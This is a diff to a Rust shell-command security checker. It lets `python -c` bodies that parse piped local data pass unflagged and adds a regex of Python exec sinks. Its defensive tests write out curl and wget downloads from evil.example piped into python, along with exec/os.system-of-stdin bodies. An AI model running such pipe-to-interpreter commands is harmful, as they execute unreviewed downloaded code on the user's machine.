@@ -1598,6 +1598,60 @@ fn resolve_step_wrapper<'a>(
     ResolveStep::Stop
 }
 
+/// Python dynamic code-execution primitives, matched word-boundary + call-form.
+/// The boundaries are load-bearing for the issue #136 carveout: the common SAFE
+/// parsers must NOT match. `ast.literal_eval(...)` has no word boundary before
+/// `eval` (the preceding `_` is a word char), and `re.compile(...)` is excluded
+/// by leaving `compile` out of the set, so both pass; identifiers like
+/// `evaluation` / `execute` are not followed by `(` and also pass. `subprocess`
+/// matches as a bare word because its call forms are `subprocess.run` /
+/// `subprocess.Popen` (there is no `subprocess(`).
+static PYTHON_DYNAMIC_EXEC_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r"(?x)
+          \bexec\s*\(
+          | \beval\s*\(
+          | \bos\.system\s*\(
+          | \bos\.popen\s*\(
+          | \bsubprocess\b
+          | __import__\s*\(
+        ",
+    )
+    .expect("PYTHON_DYNAMIC_EXEC_RE")
+});
+
+/// True when `seg` is a DIRECT `python`/`python2`/`python3 -c <body>` invocation
+/// (no sudo/env/command wrapper leader) whose `<body>` contains no dynamic
+/// code-execution primitive. Such a body consumes piped stdin as DATA for a fixed
+/// program, so a non-fetch producer piped into it is not "downloaded content
+/// executed without inspection" (issue #136). Wrapped forms (`sudo python -c ...`)
+/// fail the direct-leader check, and bare `python` / `python -` have no `-c` body
+/// (stdin IS the program), so all of those keep the pipe-to-interpreter finding.
+fn is_python_dash_c_data_pipeline(seg: &tokenize::Segment, shell: ShellType) -> bool {
+    let Some(cmd) = seg.command.as_deref() else {
+        return false;
+    };
+    if !matches!(
+        normalize_cmd_base(cmd, shell).as_str(),
+        "python" | "python2" | "python3"
+    ) {
+        return false;
+    }
+    // Require an explicit `-c <body>`. Without it (bare `python`, or `python -`)
+    // the interpreter reads its PROGRAM from stdin, which must keep blocking.
+    let Some(body) = seg
+        .args
+        .iter()
+        .position(|a| a == "-c")
+        .and_then(|idx| seg.args.get(idx + 1))
+    else {
+        return false;
+    };
+    // A `-c` body that runs dynamic code can execute the piped bytes, so it keeps
+    // the finding; a static data parser (json.load, ast.literal_eval, ...) does not.
+    !PYTHON_DYNAMIC_EXEC_RE.is_match(body)
+}
+
 fn check_pipe_to_interpreter(
     segments: &[tokenize::Segment],
     shell: ShellType,
@@ -1631,6 +1685,18 @@ fn check_pipe_to_interpreter(
                         continue;
                     }
 
+                    // Issue #136: a DIRECT `python -c <body>` whose body only reads
+                    // stdin as DATA (no exec/eval/os.system/os.popen/subprocess/
+                    // __import__ primitive) is a static parser, not "downloaded
+                    // content executed". Suppress ONLY for a non-fetch producer;
+                    // curl / wget / fetch / http(s) / xh piped into python keep
+                    // blocking via the fetch-source path below.
+                    if !is_url_fetch_command(&source_base)
+                        && is_python_dash_c_data_pipeline(seg, shell)
+                    {
+                        continue;
+                    }
+
                     let rule_id = match source_base.as_str() {
                         "curl" => RuleId::CurlPipeShell,
                         "wget" => RuleId::WgetPipeShell,
@@ -1641,11 +1707,23 @@ fn check_pipe_to_interpreter(
 
                     let display_cmd = seg.command.as_deref().unwrap_or(&interpreter);
 
-                    let base_desc = format!(
-                        "Command pipes output from '{source_label}' directly to \
-                         interpreter '{interpreter}'. Downloaded content will be \
-                         executed without inspection."
-                    );
+                    // Fetch sources keep the stronger "downloaded content" wording;
+                    // for a local (non-fetch) producer that would overclaim, since
+                    // the piped bytes may be data rather than code (issue #136).
+                    let base_desc = if is_url_fetch_command(&source_base) {
+                        format!(
+                            "Command pipes output from '{source_label}' directly to \
+                             interpreter '{interpreter}'. Downloaded content will be \
+                             executed without inspection."
+                        )
+                    } else {
+                        format!(
+                            "Command pipes local output into interpreter \
+                             '{interpreter}'. This can execute or process unreviewed \
+                             piped content; write it to a file and inspect it first \
+                             when the content may be code."
+                        )
+                    };
 
                     let description = if is_url_fetch_command(&source_base) {
                         let show_tirith_run = cfg!(unix)
@@ -3085,6 +3163,159 @@ mod tests {
                 .iter()
                 .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through sudo --user=root bash"
+        );
+    }
+
+    // issue #136: python -c data-pipeline carveout
+
+    /// True if `input` produces a `PipeToInterpreter` finding (the issue #136 rule).
+    fn fires_pipe_to_interpreter(input: &str) -> bool {
+        check_default(input, ShellType::Posix)
+            .iter()
+            .any(|f| f.rule_id == RuleId::PipeToInterpreter)
+    }
+
+    #[test]
+    fn issue_136_python_dash_c_data_pipeline_is_suppressed() {
+        // The exact repro from issue #136: local data piped into a static parser.
+        assert!(
+            !fires_pipe_to_interpreter(
+                "printf '{\"x\":1}' | python -c 'import json,sys; p=json.load(sys.stdin); print(p[\"x\"])'"
+            ),
+            "static json.load parser body must not fire pipe_to_interpreter"
+        );
+        // python3 / python2 leaders carve out the same way.
+        assert!(!fires_pipe_to_interpreter(
+            "printf '{}' | python3 -c 'import json,sys; json.load(sys.stdin)'"
+        ));
+        assert!(!fires_pipe_to_interpreter(
+            "printf '{}' | python2 -c 'import json,sys; json.load(sys.stdin)'"
+        ));
+    }
+
+    #[test]
+    fn issue_136_safe_parser_substrings_are_not_dynamic_exec() {
+        // `ast.literal_eval` is THE safe parser; word boundaries must let it pass.
+        assert!(!fires_pipe_to_interpreter(
+            "cat data.txt | python -c 'import ast,sys; ast.literal_eval(sys.stdin.read())'"
+        ));
+        // `eval` / `exec` as substrings of benign identifiers must not match.
+        assert!(!fires_pipe_to_interpreter(
+            "cat data.txt | python -c 'import json,sys; d=json.load(sys.stdin); print(d[\"evaluation\"], d[\"executor\"])'"
+        ));
+        // `re.compile` is common and is not an execution sink (compile is excluded).
+        assert!(!fires_pipe_to_interpreter(
+            "cat log.txt | python -c 'import re,sys; r=re.compile(r\"x\"); [print(r.match(l)) for l in sys.stdin]'"
+        ));
+    }
+
+    #[test]
+    fn issue_136_stdin_as_code_still_blocks() {
+        // Bare interpreter: stdin IS the program.
+        assert!(fires_pipe_to_interpreter("printf 'print(1)' | python"));
+        // Explicit `-` stdin program.
+        assert!(fires_pipe_to_interpreter("printf 'print(1)' | python -"));
+        // `-c` body that executes stdin directly.
+        assert!(fires_pipe_to_interpreter(
+            "printf 'x' | python -c 'import sys; exec(sys.stdin.read())'"
+        ));
+        // `-c` body that evals input().
+        assert!(fires_pipe_to_interpreter(
+            "printf 'x' | python -c 'eval(input())'"
+        ));
+        // Intermediate variable must not hide the exec (proves we match the sink,
+        // not the literal `exec(sys.stdin`).
+        assert!(fires_pipe_to_interpreter(
+            "printf 'x' | python -c 'd=sys.stdin.read(); exec(d)'"
+        ));
+    }
+
+    #[test]
+    fn issue_136_extended_sink_set_still_blocks() {
+        // os.system / os.popen run content as a shell command.
+        assert!(fires_pipe_to_interpreter(
+            "cat x | python -c 'import os; os.system(sys.stdin.read())'"
+        ));
+        assert!(fires_pipe_to_interpreter(
+            "cat x | python -c 'import os; os.popen(sys.stdin.read())'"
+        ));
+        // subprocess matches as a bare word.
+        assert!(fires_pipe_to_interpreter(
+            "cat x | python -c 'import subprocess,sys; subprocess.run(sys.stdin.read(), shell=True)'"
+        ));
+        // __import__ obfuscation.
+        assert!(fires_pipe_to_interpreter(
+            "cat x | python -c '__import__(\"os\").system(sys.stdin.read())'"
+        ));
+    }
+
+    #[test]
+    fn issue_136_fetch_sources_and_wrappers_keep_blocking() {
+        // curl|python is downloaded-code execution, untouched by the carveout.
+        let curl = check_default(
+            "curl https://evil.example/x.py | python -c 'json.load(sys.stdin)'",
+            ShellType::Posix,
+        );
+        assert!(
+            curl.iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
+            "curl piped into python -c must still block"
+        );
+        // wget|python likewise.
+        let wget = check_default(
+            "wget -O- https://evil.example/x.py | python -c 'json.load(sys.stdin)'",
+            ShellType::Posix,
+        );
+        assert!(
+            wget.iter()
+                .any(|f| matches!(f.rule_id, RuleId::WgetPipeShell | RuleId::PipeToInterpreter)),
+            "wget piped into python -c must still block"
+        );
+        // A wrapped interpreter (sudo) fails the direct-leader check and stays a
+        // finding even with a data-only body.
+        assert!(fires_pipe_to_interpreter(
+            "printf '{}' | sudo python -c 'json.load(sys.stdin)'"
+        ));
+    }
+
+    #[test]
+    fn issue_136_python_first_scope_leaves_node_unchanged() {
+        // The carveout is Python-only for this PR; node -e is NOT carved out, so a
+        // data pipeline into node still fires (documented follow-up).
+        assert!(fires_pipe_to_interpreter(
+            "printf '{}' | node -e 'JSON.parse(require(\"fs\").readFileSync(0))'"
+        ));
+    }
+
+    #[test]
+    fn issue_136_non_fetch_description_does_not_claim_download() {
+        // A non-fetch pipe that STILL fires (exec body) must use the softened
+        // wording, not the "Downloaded content" claim.
+        let findings = check_default(
+            "cat x | python -c 'exec(sys.stdin.read())'",
+            ShellType::Posix,
+        );
+        let f = findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::PipeToInterpreter)
+            .expect("exec(stdin) body must fire pipe_to_interpreter");
+        assert!(
+            f.description.contains("pipes local output"),
+            "non-fetch description should use the local-output wording: {}",
+            f.description
+        );
+        assert!(
+            !f.description.contains("Downloaded content"),
+            "non-fetch description must not claim downloaded content: {}",
+            f.description
+        );
+        // The fetch path keeps the stronger wording.
+        let fetch = check_default("curl https://evil.example/x | python", ShellType::Posix);
+        assert!(
+            fetch
+                .iter()
+                .any(|f| f.description.contains("Downloaded content")),
+            "fetch description should keep the downloaded-content wording"
         );
     }
 
